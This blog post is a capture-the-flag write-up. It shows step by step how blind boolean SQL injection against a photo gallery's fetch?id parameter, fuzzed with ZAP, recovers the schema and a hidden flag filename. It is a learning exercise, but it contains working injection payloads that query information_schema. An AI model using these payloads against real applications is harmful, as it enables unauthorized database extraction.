---
layout: post
title: H1 CTF - Photo Gallery (Flag1)
---

In the start page of this CTF you are presented with photos of two cats each
with its own label and a third blank photo labelled invisible. Viewing the
source code of the page you'll find the following `fetch?id=1`, `fetch?id=2`
and `fetch?id=3`. We can safely assume that this are the ids for each picture.
Adding this to the url `xx.xx.xx.xx/xxxxxx/fetch?id=1` will send you to a page
with the screenshot below.

![ctf photogallery fetch page](/assets/images/ctf_h1/photogallery_fetch_page.png)

Looking at the page you'll notice the keywords jfif, jpeg which we can safely
assume to be one of the pictures on the start page of this CTF. 

## Testing for sql injection

In the url type, `xx.xx.xx.xx/xxxxx/fetch?id=1 AND 1=1--`, this produces the
same image above. This confirms that it is vulnerable to sql injection.

## Finding the database name, table names, and column names for each table

Here we are going to use ZAPs manual editor and fuzzer. First we find the
database length. In the editor, add the following: `/fetch?id=1 AND
length(database())='5'--`. Change '5' to other numbers until a `200 OK` is seen
on the response tab or use the fuzzer where the same will be the one being
fuzzed.

![ctf photogallery database length](/assets/images/ctf_h1/photogallery_dbase_length.png)

Looking at the image above, the length of the database name is 6. Note that I
change the method to HEAD to prevent the loading of the image.

Next we find the database name. We cannot directly find the name of the
database but we can determine each letter of the database name. Using the
following statement we can check the first letter of the database name.

`/fetch?id=1 AND substring((database()),1,1)='a'--`

The statement above checks if the first letter of the database name is 'a'. If
it is the same page as above will be returned, otherwise a 404 not found will
be returned. For the second character we only need to change the `1,1` to
`2,1`. We can automate the checking by using fuzzer of ZAP, with the character
'a' as a placeholder for the  payload. Below is the screenshot of finding the
first letter of the database name. 

![ctf photogallery first letter dbase name](/assets/images/ctf_h1/photogallery_first_letter_dbname.png)

The database name is **level5**.

We next find how many table/s are in the database. Similar to finding the
database name, we cannot directly find the number of tables present in the
database. But we can also apply some sql injection to find the number of
tables. The following statement counts how many rows a particular database name
appears in a table.

`select count(*) from information_schema.tables where table_schema = database())`

Using the above statement we can create another statement that will find the
number of tables present in the database.

`/fetch?id=1 AND (select count(*) from information_schema.tables where table_schema = 'level5') = 1--`

Here, the statement after AND checks if the number of tables is equal to 1. If
true, it will show the page above, otherwise it will return a 404 not found. By
adjusting the number, using either fuzzer or manually, we can find the number
of tables. Using fuzzer, the number `1` will serve as the placeholder for our
payload. Below is the screenshot of request editor of ZAP. Note that the value
`2` returns the 200 OK result.

![photogallery number of tables](/assets/images/ctf_h1/photogallery_table_count.png)

Next we find the table name. Similarly, we cannot directly find the names of
the table. But using similar logic above we can find the names. But first we
have to find the length of each tables' name.

`select table_name from information_schema.tables where table_schema = database() limit 1`

The above statment will select the first table name or will print the first
table name listed in a table. To select the  second table we change `limit 1`
to `limit 1,1`. Using the above information we can create a statement that will
find the length of the first table.

`/fetchid=1 AND length((select table_name from information_schema.tables where table_schema = 'level5' limit 1)) = 1--`

The statement after AND checks if the length of the table is 1. If it is, it
will return the above page, otherwise it will return a 404 not found. Adjusting
the value `1` manually or via fuzzer will determine the length of the table.
Below shows fuzzers result where payload value 6 returns a 200 OK.

![photogallery length of table 1](/assets/images/ctf_h1/photogallery_table1_length.png)

Table name lengths: table 1 = 6, table 2 = 6.

Next we find the table name. Again using the statement above we can find the
name of each table.

`/fetch?id=1 AND substring((select table_name from information_schema.tables where table_schema = 'level5' limit 1),1,1) = 'a'--`

The statement after AND checks if the first letter of the table name is 'a'. If
it is, it returns the above page, otherwise it returns a 404 not found. For the
second table change `limit 1` to `limit 1,1`. The screenshot below shows
fuzzers result where the payload value 'a' returns a 202 OK.

![photogallery table1 name first letter](/assets/images/ctf_h1/photogallery_table1_first_letter.png)

Table names: *albums*, *photos*.

Next we find the column names for each table. But first we find the number of
columns for each table.

`/fetch?id=1 AND (select count (*) from information_schema.columns where table_schema = 'level5' and table_name = 'photos') = 1--`

The statement after AND above checks if the number of columns in *photos* table
is equal to 1. If it is, it returns the page above otherwise it returns a 404
not found. The screenshot below shows fuzzers result where the payload value 4
returns a 200 OK. This is the column count for the *photos* table. 

![photogallery number of columns for photos table](/assets/images/ctf_h1/photogallery_column_count_for_photos_table.png)

Number of columns: *photos* = 4, *albums* = 2.

Next we find the name of each column per table. First we also need to find the
length of each column name. Below are the sql statements and their meaning.

`/fetch?id=1 AND (length((select column_name from information_schema.columns where table_schema='level5' and table_name='photos' limit 1))=1)--`

Check the length of the first column name in photos table. If it is 1, it
retuns the above page, otherwise it returns a 404 not found.For the second
column names, change `limit 1` to `limit 1,1`. Change the appropriate values
for the 3rd and 4th column names.

The length of each column name for each tables:

* photos table
    * column name 1 = 2
    * column name 2 = 5
    * column name 3 = 8
    * column name 4 = 6
* albums table
    * column name 1 = 2
    * column name 2 = 5

`/fetch?id=1 AND (substring((select column_name from information_schema.columns where table_schema='level5' and table_name='photos' limit 1), 1,1) = 'a')--`

Check the first letter of the first column name in photos table. If it is 'a',
it returns the above page, otherwise it returns a 404 page not found. For other
column names, change the appropriate values similar to the last.

The names of each column for each tables:

* photos table
    * id
    * title
    * filename 
    * parent
* albums table
    * id
    * title

With the list of tables and column names above, lets get the filename for id =
3 in the photos table. First lets get its length.

`/fetch?id=1 AND (length((select filename from photos where id=3))=1)--`

Below is the screenshot of fuzzers result where the payload value 64 returns a
200 OK. This is the length of the filename.

![photogallery length of filename for id 3](/assets/images/ctf_h1/photogallery_length_filename_id3.png)

Once we get the length, we can find the name of id = 3.

`/fetch?id=1 AND (substring((select filename from photos where id=3),1,1)='a')--`

Below is the screenshot of fuzzers result where the payload value 'f' returns a
200 Ok. This is the first letter of the filename of id = 3.

![photogallery first letter of filename of id 3](/assets/images/ctf_h1/photogallery_first_letter_filename_id3.png)

The filename is: f3dc7c9334120714439745e3c5c6---------------------7b4befe0bd7853d

The filename is flag 1.

The other filenames are: */files/adorable.jpg* and */files/purrfect.jpg*.
